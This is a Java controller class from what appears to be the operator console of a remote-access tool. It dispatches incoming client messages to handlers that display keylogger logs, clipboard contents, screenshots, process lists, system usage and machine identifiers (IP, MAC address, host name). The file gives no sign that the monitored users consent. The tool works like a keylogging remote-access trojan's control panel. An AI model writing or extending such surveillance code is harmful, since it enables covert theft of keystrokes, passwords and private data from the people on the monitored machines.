package controllers;

import admin.Admin;
import controllers.base.ConsumeExecutable;
import models.SystemInfoModel;
import org.json.JSONArray;
import swing.ProcessDialog;
import swing.index;
import utils.JSON;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;

import static utils.Command.*;
import static utils.Environment.*;

public class ConsumeController {
    private static Map<String, ConsumeExecutable<JSON>> controller = new HashMap();

    public static void init() {
        put(COMMAND_CLIENT_SYSTEM_USAGE, ConsumeController::getMonitoring);
        put(COMMAND_CLIENT_CLIPBOARD, ConsumeController::getClipboard);
        put(COMMAND_CLIENT_KEYLOGGER, ConsumeController::getKeylogger);
        put(COMMAND_GET_CLIENTS, ConsumeController::getAllClients);
        put(COMMAND_CLIENT_PROCESS, ConsumeController::getProcess);
        put(COMMAND_CLIENT_MONITOR, ConsumeController::getScreen);
        put(COMMAND_NOTIFICATION, ConsumeController::notify);
        put(COMMAND_SYNC, ConsumeController::synchronize);
    }

    private static void getScreen(JSON input, Admin admin) {
        try {
            if(!index.workers.get(index.MONITOR_WORKER).getStatus()) return;

            if (!input.get("form").equals(Admin.getGui().getCurrentClientId())) return;

            JSONArray imageBuffer = new JSONArray(input.get("image"));
            int length = input.getInt("length");
            byte[] bytes = new byte[length];

            for (int i = 0; i < length; i++) {
                bytes[i] = Byte.parseByte(imageBuffer.get(i).toString());
            }

            ByteArrayInputStream stream = new ByteArrayInputStream(ByteBuffer.wrap(bytes).array());
            BufferedImage image = ImageIO.read(ImageIO.createImageInputStream(stream));
            ImageIcon imageIcon = new ImageIcon(image);
            Admin.getGui().fetchClientMonitor(imageIcon);
        } catch (Exception e) {

        }
    }

    private static void getProcess(JSON input, Admin admin) {
        JSONArray arr = new JSONArray(input.get("processes"));
        ProcessDialog dialog = new ProcessDialog(arr, admin);
        dialog.setVisible(true);
    }

    private static void synchronize(JSON input, Admin admin) {
        Admin.getGui().sync();
        admin.resetClients();
        ConsumeController.getAllClients(input, admin);
    }

    private static void getKeylogger(JSON input, Admin admin) {
        String[] logs = input.get("keylogger").split(KEYLOGGER_SPLITTER);
        if (logs.length == 1 && logs[0].isEmpty()) {
            Admin.getGui().appendLog(String.format(KEYLOGGER_TEMPLATE, EMPTY));
            return;
        }

        for (String log : logs) {
            Admin.getGui().appendLog(String.format(KEYLOGGER_TEMPLATE, log));
        }
    }

    private static void getClipboard(JSON input, Admin admin) {
        String clipboard = input.get("clipboard");
        Admin.getGui().appendLog(String.format(CLIPBOARD_TEMPLATE, clipboard.isEmpty() ? EMPTY : clipboard));
    }

    private static void getAllClients(JSON input, Admin admin) {
        HashMap clients = admin.getClients();
        JSONArray arr = new JSONArray(input.get("clients"));
        arr.forEach(e -> {
            JSON json = new JSON(e.toString());
            clients.putIfAbsent(json.get("UUID"), new SystemInfoModel(
                    json.get("ram"),
                    json.get("cpu"),
                    json.get("disk"),
                    json.get("os"),
                    json.get("ip"),
                    json.get("MAC_address"),
                    json.get("hostName")
            ));
        });
        Admin.getGui().fetchTable();
    }

    private static void getMonitoring(JSON input, Admin admin) {
        try {
            if(!index.workers.get(index.SYSTEM_USAGE_WORKER).getStatus()) return;
            if (!input.get("form").equals(Admin.getGui().getCurrentClientId())) {
                return;
            }
            Admin.getGui().fetchClientSystemUsage(
                    input.getInt("cpu"),
                    input.getInt("ram"),
                    input.getInt("disk"));
        } catch (Exception e) {
            // IN SOME CASE, CLIENT CAN NOT CALCULATE PERCENT CPU USAGE
            Admin.getGui().fetchClientSystemUsage(0, input.getInt("ram"), input.getInt("disk"));
        }
    }

    private static void notify(JSON input, Admin admin) {
        Admin.getGui().showNotification(input.get("notification"));
    }

    //CONCEPTION
    private static void getNotFoundController(JSON jsonObject, Admin admin) throws Exception {
        throw new Exception("Invalid Command");
    }

    public static ConsumeExecutable get(String key) {
        return controller.getOrDefault(key, ConsumeController::getNotFoundController);
    }

    public static ConsumeExecutable put(String key, ConsumeExecutable<JSON> value) {
        return controller.put(key, value);
    }
}
